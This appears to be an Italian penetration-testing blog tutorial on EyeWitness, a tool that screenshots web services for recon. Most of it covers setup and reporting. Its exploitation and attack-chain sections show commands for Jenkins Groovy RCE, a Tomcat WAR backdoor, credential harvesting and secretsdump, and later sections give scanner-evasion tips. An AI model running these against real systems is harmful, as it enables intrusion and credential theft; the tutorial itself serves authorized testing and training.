---
title: 'Eyewitness: Visual Recon e Screenshot Automation per Triage Web su larga scala'
slug: eyewitness
description: Eyewitness automatizza screenshot e analisi di servizi web e RDP. Visual recon rapida per identificare pannelli admin e superfici d’attacco esposte.
image: /Gemini_Generated_Image_54xpwy54xpwy54xp.webp
draft: true
date: 2026-02-13T00:00:00.000Z
categories:
  - web-hacking
subcategories:
  - recon
tags:
  - surface-mapping
---

Quando in un engagement ti ritrovi con 150, 300 o 800 host web attivi, il problema non è trovarli — è **capire velocemente cosa sono**. Visitare ogni URL a mano è tempo perso. Scrivere screenshot uno per uno è peggio. E presentare tutto in modo ordinato al cliente è ancora più complicato.

EyeWitness nasce proprio per questo: prende una lista di target e li trasforma in una panoramica visiva completa. Ogni servizio web viene renderizzato, fotografato e inserito in un report strutturato. In pochi minuti puoi vedere login panel, console amministrative, pagine di errore, ambienti di staging dimenticati o applicazioni legacy ancora esposte.

Il valore reale non è lo screenshot in sé, ma il contesto. EyeWitness associa informazioni tecniche, classifica i risultati e crea un output pronto per essere integrato nel report finale. Dopo una fase di enumerazione con [https://hackita.it/articoli/nmap](https://hackita.it/articoli/nmap), diventa lo strumento che ti permette di passare dal “c’è una porta 8080 aperta” al “questa è una console Jenkins accessibile”.

Si inserisce nella fase di Reconnaissance come strumento di triage e documentazione: accelera l’analisi, migliora la qualità delle evidenze e riduce drasticamente il tempo necessario per organizzare i risultati di un assessment web su larga scala.

***

## 1️⃣ Setup e Installazione

```bash
# Clone + install
git clone https://github.com/FortyNorthSecurity/EyeWitness.git
cd EyeWitness/Python/setup
sudo ./setup.sh

# Installs: Python deps, ChromeDriver, PhantomJS, Geckodriver

# Verify
cd ../
python3 EyeWitness.py --help
```

***

## 2️⃣ Uso Base

```bash
# URLs from file
python3 EyeWitness.py -f targets.txt -d output_folder --headless

# Nmap XML input
nmap -p 80,443,8080 -oX scan.xml 10.10.10.0/24
python3 EyeWitness.py -x scan.xml -d eyewitness_output --headless

# Single URL
python3 EyeWitness.py --single http://target.com -d quick_scan
```

**Output:** HTML report con screenshots, metadata, categorization.

***

## 3️⃣ Default Credentials Detection

```bash
python3 EyeWitness.py -f web_services.txt -d default_creds_check --headless
```

**Output identifies:**

```
[!] Jenkins (http://ci.company.com:8080)
    Category: Default Credentials Opportunity
    Default Creds: admin/admin, jenkins/jenkins
    Version: Jenkins 2.235.1
    
[!] Tomcat Manager (http://app.company.com:8080/manager)
    Category: Default Credentials Opportunity
    Default Creds: admin/admin, tomcat/tomcat
    Recommendation: HIGH PRIORITY - Manager App = RCE
```

**Exploitation:**

```bash
# Test Jenkins
curl -u admin:admin http://ci.company.com:8080/script
# [200] Access!

# Groovy RCE
curl -u admin:admin -X POST \
  -d 'script=println "id".execute().text' \
  http://ci.company.com:8080/script
# uid=1000(jenkins)

# Tomcat Manager
curl -u admin:password http://app.company.com:8080/manager/html
# [200] Manager access

# Deploy WAR backdoor
curl -u admin:password --upload-file shell.war \
  http://app.company.com:8080/manager/text/deploy?path=/shell
```

**Timeline:** 15 min scan + 30 min testing

***

## 4️⃣ Client Report Generation

```bash
# Comprehensive
python3 EyeWitness.py -f inscope_urls.txt \
  -d client_report \
  --headless \
  --timeout 20 \
  --threads 10
```

**HTML Report structure:**

```
Executive Summary
├─ URLs Scanned: 156
├─ Interesting: 23
│  ├─ Default Credentials: 5
│  ├─ Outdated Software: 8
│  ├─ Info Disclosure: 10
└─ Risk: MEDIUM

Detailed Findings
├─ Default Credentials (5)
│  ├─ Jenkins - CRITICAL
│  └─ phpMyAdmin - HIGH
│
├─ Outdated Software (8)
│  ├─ WordPress 4.9.8 - HIGH
│  └─ jQuery 1.12.4 - MEDIUM
│
└─ Info Disclosure (10)
   └─ Directory Listing - MEDIUM

Screenshots Gallery
[Grid view categorized]
```

**Excel export:**

```bash
python3 EyeWitness.py -f urls.txt -d excel_output --headless
# Output: report.xlsx
```

**Columns:** URL, Status, Title, Server, Technologies, Screenshot (embedded), Risk, Action

**Timeline:** 30 min scan + 1 hr customization

***

## 5️⃣ Large-Scale Assessment (500+ URLs)

```bash
# Split for performance
split -l 100 massive_scope.txt batch_

# Parallel
for batch in batch_*; do
  python3 EyeWitness.py -f $batch -d output_${batch} --headless --threads 15 &
done
wait

# Fast mode
python3 EyeWitness.py -f urls.txt \
  -d fast_scan \
  --headless \
  --timeout 10 \
  --threads 20
```

**Timeline:** 2-3 hrs per 500 URLs (optimized)

***

## 6️⃣ Advanced Features

### Custom HTTP headers

```bash
python3 EyeWitness.py -f targets.txt \
  --headless \
  --user-agent "Custom/1.0" \
  --add-http-header "Authorization: Bearer TOKEN"
```

### Proxy configuration

```bash
python3 EyeWitness.py -f targets.txt \
  --headless \
  --proxy-ip 127.0.0.1 \
  --proxy-port 8080
```

### Resume scan

```bash
python3 EyeWitness.py --resume output_folder
```

### VNC/RDP support

```bash
# Not just web
python3 EyeWitness.py --vnc -f vnc_hosts.txt -d vnc_screenshots
python3 EyeWitness.py --rdp -f rdp_hosts.txt -d rdp_screenshots
```

***

## 7️⃣ Integration

### Pre-EyeWitness: Masscan

```bash
masscan -p80,443,8080,8443 10.0.0.0/8 -oL results.txt
grep "open" results.txt | awk '{print $4":"$3}' > web_targets.txt
python3 EyeWitness.py -f web_targets.txt -d eyewitness_out
```

### EyeWitness → [Nikto](https://hackita.it/articoli/nikto)

```bash
cat eyewitness_output/report.json | jq -r '.[] | select(.status == 200) | .url' > live.txt
nikto -h live.txt -o nikto_results.txt
```

### vs [Aquatone](https://hackita.it/articoli/aquatone)

```bash
# Run both
python3 EyeWitness.py -f targets.txt -d eyewitness_out --headless
cat targets.txt | aquatone -out aquatone_out

# EyeWitness: Better reports, metadata
# Aquatone: Faster, better clustering
# Use both! EyeWitness per client, Aquatone per rapid analysis
```

***

## 8️⃣ Attack Chain

**FASE 1:** Network discovery (5 min)

```bash
masscan -p80,443,8080,8443 192.168.1.0/24 --rate 1000
```

**FASE 2:** Visual recon (30 min)

```bash
python3 EyeWitness.py -f web_targets.txt -d scan --headless
```

**Identifies:** Jenkins (192.168.1.50:8080) Default Credentials

**FASE 3:** Credential testing (10 min)

```bash
curl -u admin:admin http://192.168.1.50:8080/script
# [200] Access
```

**FASE 4:** Credential harvesting (20 min)

```bash
# Jenkins stores build credentials
curl -u admin:admin http://192.168.1.50:8080/job/Deploy-Prod/lastBuild/consoleText | grep password
# domain-admin:P@ssw0rd2024!
```

**FASE 5:** Domain compromise (15 min)

```bash
crackmapexec smb 192.168.1.10 -u domain-admin -p 'P@ssw0rd2024!' --sam
secretsdump.py DOMAIN/domain-admin:'P@ssw0rd2024!'@192.168.1.10
```

**TOTALE:** \~1.5 hrs network → Domain Admin

**Ruolo EyeWitness:** Visual report identified Jenkins con default credentials tra 50+ services. Professional categorization = immediate prioritization.

***

## 9️⃣ Detection & Evasion

**Blue Team detecta:**

* WAF logs: Python-urllib/3.x UA
* IDS: Automated scanner pattern
* SIEM: 50+ HTTP requests in 15 min

**Evasion:**

```bash
# Custom UA
python3 EyeWitness.py -f targets.txt \
  --user-agent "Mozilla/5.0 (Windows NT 10.0)"

# Throttle
python3 EyeWitness.py -f targets.txt --threads 2 --timeout 30

# Proxy rotation
for proxy in $(cat proxies.txt); do
  python3 EyeWitness.py -f batch.txt --proxy-ip $proxy
done
```

***

## 10️⃣ Performance

**Benchmark:**

* 20 URLs: 5m30s
* 100 URLs @ 10 threads: 35m15s
* 500 URLs: 2-3 hrs (split + parallel)

**Resources:**

* CPU: High (60-80% per thread)
* RAM: \~2GB + 200MB per Chromium
* Disk: \~150KB per screenshot

***

## 11️⃣ Tables

| **Command**                        | **Function** |
| ---------------------------------- | ------------ |
| `EyeWitness.py -f file.txt -d out` | Basic        |
| `EyeWitness.py -x nmap.xml -d out` | Nmap input   |
| `EyeWitness.py --headless`         | Headless     |
| `EyeWitness.py --timeout 30`       | Long timeout |
| `EyeWitness.py --vnc -f vnc.txt`   | VNC          |

**Default Creds Detection:**

* Jenkins: \~95%
* Tomcat: \~90%
* phpMyAdmin: \~85%

***

## 12️⃣ Troubleshooting

**Chromium crashes:**

```bash
# Switch to PhantomJS
python3 EyeWitness.py -f targets.txt --phantom-js

# Increase resources
ulimit -n 4096
```

**Blank screenshots:**

```bash
python3 EyeWitness.py -f targets.txt --timeout 30 --jitter 5
```

***

## 13️⃣ FAQ

**Q: Richiede GUI?**
A: No con `--headless`.

**Q: Spazio per 500 screenshots?**
A: \~75-100 MB.

**Q: Authenticated pages?**
A: Limited. Can pass headers but no complex JS auth flows.

**Q: Più lento di Aquatone?**
A: Yes \~2-3x. Trade-off: better reports, metadata.

**Q: Customize branding?**
A: Yes, edit `modules/reporting.py`.

***

## Cheat Sheet

| **Scenario** | **Command**                                              |
| ------------ | -------------------------------------------------------- |
| **Basic**    | `python3 EyeWitness.py -f urls.txt -d out --headless`    |
| **Nmap**     | `python3 EyeWitness.py -x nmap.xml -d out --headless`    |
| **Fast**     | `python3 EyeWitness.py -f urls.txt --threads 20`         |
| **Proxy**    | `python3 EyeWitness.py -f urls.txt --proxy-ip 127.0.0.1` |
| **Resume**   | `python3 EyeWitness.py --resume output_folder`           |

***

## Perché Rilevante 2026

Professional pentest richiede professional reports. Clients (non-technical) need visual evidence, non raw terminal output. EyeWitness bridges gap tra technical findings e business communication. Modern engagements = hundreds di web properties. Default creds detection automated = time saver. Compliance (PCI-DSS, ISO 27001) require documented evidence - Excel reports = audit-ready.

***

## Differenze

| **Tool**       | **Quando**                        | **Limiti**       |
| -------------- | --------------------------------- | ---------------- |
| **EyeWitness** | Client deliverables, professional | Slower           |
| **Aquatone**   | Rapid triage, clustering          | Less polished    |
| **Gowitness**  | Speed-critical                    | Minimal features |

***

## Hardening

**Defenders:**

1. Disable default credentials
2. WAF rate limiting
3. User-Agent filtering
4. Network segmentation (admin panels non public)
5. Authentication logging

***

## OPSEC

**Noise:** Alto. Many requests, Python UA.

**Logs:** Web access, WAF, IDS.

**Reduce:** Custom UA, throttle, proxy rotation, business hours execution.

**Detection:** Easy senza evasion. Python UA = giveaway.

***

## Disclaimer

EyeWitness per **authorized pentest**. Screenshot senza autorizzazione = unauthorized access. Usa in: authorized pentest, bug bounty (in-scope) o sulle tue vm/ctf.

**Repository:** [https://github.com/FortyNorthSecurity/EyeWitness](https://github.com/FortyNorthSecurity/EyeWitness)

***

Vuoi supportare HackIta? Visita [hackita.it/supporto](https://hackita.it/supporto) per donazioni. Per penetration test professionali e formazione 1:1, scopri [hackita.it/servizi](https://hackita.it/servizi).
